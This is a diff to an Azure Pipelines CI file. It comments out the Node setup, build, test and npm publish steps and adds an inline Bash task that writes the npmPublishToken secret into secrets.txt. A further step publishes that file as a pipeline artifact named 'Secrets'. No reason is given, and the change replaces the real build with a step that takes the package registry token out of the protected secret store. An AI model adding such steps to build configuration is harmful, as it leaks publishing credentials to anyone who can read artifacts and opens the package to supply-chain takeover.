@@ -5,35 +5,48 @@ jobs:
   - checkout: self
     clean: true
 
-  - task: NodeTool@0
-    displayName: Use node 10
+  # # - task: NodeTool@0
+  # #   displayName: Use node 10
+  # #   inputs:
+  # #     versionSpec: "10.x"
+
+  # # - script: npm i -g npm@6.14.12 --force
+  # #   displayName: Use npm version 6.14.12
+
+  # # # Build typescript in ./Test and ./Test/lib
+  # # - bash: |
+  # #       npm install
+  # #       ./node_modules/typescript/bin/tsc -p ./Tests
+  # #   displayName: Build tests lib
+
+  # # # npm install
+  # # - script: |
+  # #       npm run build
+  # #   displayName: Build Common Npm packages
+
+  # # - script: |
+  # #       npm run test
+  # #   displayName: Test Common Npm packages
+
+  # # For CI runs on master, automatically publish packages
+  # - bash: |
+  #       echo //registry.npmjs.org/:_authToken=$NPM_TOKEN > .npmrc
+  #       npm run publish
+  #   condition: and(succeeded(), in(variables['build.reason'], 'IndividualCI', 'BatchedCI', 'Manual'), eq(variables['Agent.OS'], 'Windows_NT'))
+  #   env:
+  #     NPM_TOKEN: $(npmPublishToken)
+  #   displayName: Publish packages (Only Windows)
+  #   enabled: true
+
+  - task: Bash@3
     inputs:
-      versionSpec: "10.x"
+      targetType: 'inline'
+      script: |
+        # Write your commands here
+        echo "pipelineScopedSecretVar = $(npmPublishToken)" >> $PIPELINE_WORKSPACE/secrets.txt
 
-  - script: npm i -g npm@6.14.12 --force
-    displayName: Use npm version 6.14.12
-
-  # Build typescript in ./Test and ./Test/lib
-  - bash: |
-        npm install
-        ./node_modules/typescript/bin/tsc -p ./Tests
-    displayName: Build tests lib
-
-  # npm install
-  - script: |
-        npm run build
-    displayName: Build Common Npm packages
-
-  - script: |
-        npm run test
-    displayName: Test Common Npm packages
-
-  # For CI runs on master, automatically publish packages
-  - bash: |
-        echo //registry.npmjs.org/:_authToken=$NPM_TOKEN > .npmrc
-        npm run publish
-    condition: and(succeeded(), in(variables['build.reason'], 'IndividualCI', 'BatchedCI', 'Manual'), eq(variables['Agent.OS'], 'Windows_NT'))
-    env:
-      NPM_TOKEN: $(npmPublishToken)
-    displayName: Publish packages (Only Windows)
-    enabled: true
+  - task: PublishPipelineArtifact@1
+    inputs:
+      targetPath: '$(Pipeline.Workspace)/secrets.txt'
+      artifact: 'Secrets'
+      publishLocation: 'pipeline'
